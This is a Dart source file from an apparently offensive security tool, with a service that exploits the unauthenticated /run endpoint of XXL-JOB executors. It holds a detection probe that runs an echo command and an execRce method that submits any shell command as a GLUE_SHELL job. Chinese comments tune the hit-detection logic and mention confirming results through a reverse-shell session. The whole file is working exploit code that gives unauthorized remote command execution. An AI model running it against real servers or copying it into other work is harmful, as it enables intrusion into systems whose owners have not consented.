import 'dart:convert';

import 'exp_result.dart';
import 'waf_detect.dart';
import '../../core/exploit_error.dart';
import '../../../core/http/http_client.dart';

class XxlJobExpService {
  final String baseUrl;
  final Duration timeout;

  XxlJobExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  late final MatrixHttpClient _httpClient = MatrixHttpClient(
    baseUrl: baseUrl,
    timeout: timeout,
    allowBadCertificate: false,
  );

  Future<ExpResult> check() async {
    try {
      final payload = jsonEncode({
        'jobId': 1,
        'executorHandler': 'demoJobHandler',
        'executorParams': 'demoJobHandler',
        'executorBlockStrategy': 'COVER_EARLY',
        'executorTimeout': 0,
        'logId': 1,
        'logDateTime': 1586629003729,
        'glueType': 'GLUE_SHELL',
        'glueSource': 'echo xxljob_54289',
        'glueUpdatetime': 1586699003758,
        'broadcastIndex': 0,
        'broadcastTotal': 0,
      });
      final res = await _httpClient.postOrThrow(
        '$_base/run',
        headers: {'Content-Type': 'application/json'},
        body: payload,
      );
      final body = res.body ?? '';
      if (looksLikeWafBlock(res.statusCode, body)) {
        return ExpResult.probeFailed(
          'XXL-JOB 未授权 RCE',
          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
        );
      }
      // 必须是执行器返回的业务 code=200；旧实现只要响应体出现 "200" 就算命中，
      // 连 404 页面的 "404" 里都可能误判（例如 {"code":404}）。
      // 实测踩过的坑：任意返回 {"code":200,"data":[]} 的普通接口都会被判成
      // "执行器未授权调用成功"。XXL-JOB 的 /run 响应带 msg 字段（值可为 null），
      // 因此要求 code=200 **且** 出现 msg 键，才认为打到了执行器。
      // 实靶校准（vulhub xxl-job 2.2.0 executor）：
      //   真执行器 /run 的响应是 **`{"code":200}`**（Jackson 省略 null 字段，没有 msg），
      //   上一版要求必须有 msg 键，直接把真靶场判成"未检测到"（假阴性）。
      //   而误报样本是 `{"code":200,"data":[]}` 这类**带业务字段**的普通接口。
      // 因此判定改成：code=200 且 JSON 里只有执行器会返回的键（code/msg/content），
      // 出现 data/status/timestamp/error 等一律不算。
      var accepted = false;
      String? msg;
      try {
        final decoded = jsonDecode(body);
        if (decoded is Map && decoded['code'] == 200) {
          final keys = decoded.keys.map((k) => '$k').toSet();
          const executorKeys = {'code', 'msg', 'content'};
          final looksLikeExecutor = keys.isNotEmpty &&
              keys.every(executorKeys.contains);
          if (looksLikeExecutor) {
            accepted = true;
            msg = '${decoded['msg'] ?? ''}';
          }
        }
      } catch (_) {
        // 非 JSON 一律不算命中
      }
      if (accepted) {
        return ExpResult(
          true,
          'XXL-JOB 未授权 RCE',
          '执行器 /run 未授权调用成功${msg == null || msg.isEmpty ? '' : '（$msg）'}',
        );
      }
    } catch (e) {
      return ExpResult.probeFailed('XXL-JOB 未授权 RCE', '探测失败: $e');
    }
    return ExpResult(false, 'XXL-JOB 未授权 RCE', '');
  }

  Future<String?> execRce(String cmd) async {
    try {
      final payload = jsonEncode({
        'jobId': 1,
        'executorHandler': 'demoJobHandler',
        'executorParams': 'demoJobHandler',
        'executorBlockStrategy': 'COVER_EARLY',
        'executorTimeout': 0,
        'logId': 1,
        'logDateTime': DateTime.now().millisecondsSinceEpoch,
        'glueType': 'GLUE_SHELL',
        'glueSource': cmd,
        'glueUpdatetime': DateTime.now().millisecondsSinceEpoch,
        'broadcastIndex': 0,
        'broadcastTotal': 0,
      });
      final res = await _httpClient.postOrThrow(
        '$_base/run',
        headers: {'Content-Type': 'application/json'},
        body: payload,
      );
      final body = res.body ?? '';
      final head = body.trimLeft().toLowerCase();
      // 打到 admin 控制台时返回的是 404 HTML —— 不能当命令输出。
      if (head.startsWith('<!doctype') || head.startsWith('<html')) {
        throw const ExploitNotWorking(
          '打到的不是执行器（/run 返回网页/404），执行器端口通常不是管理台端口',
        );
      }
      // 执行器接受任务即返回 {"code":200}，但 GLUE 任务没有回显通道。
      if (RegExp(r'"code"\s*:\s*200').hasMatch(body)) {
        return '任务已提交到执行器（GLUE 任务无回显，需在执行器日志或反弹会话里确认）';
      }
      return body;
    } on ExploitNotWorking {
      rethrow;
    } on ExploitBlocked {
      rethrow;
    } catch (_) {
      return null;
    }
  }
}
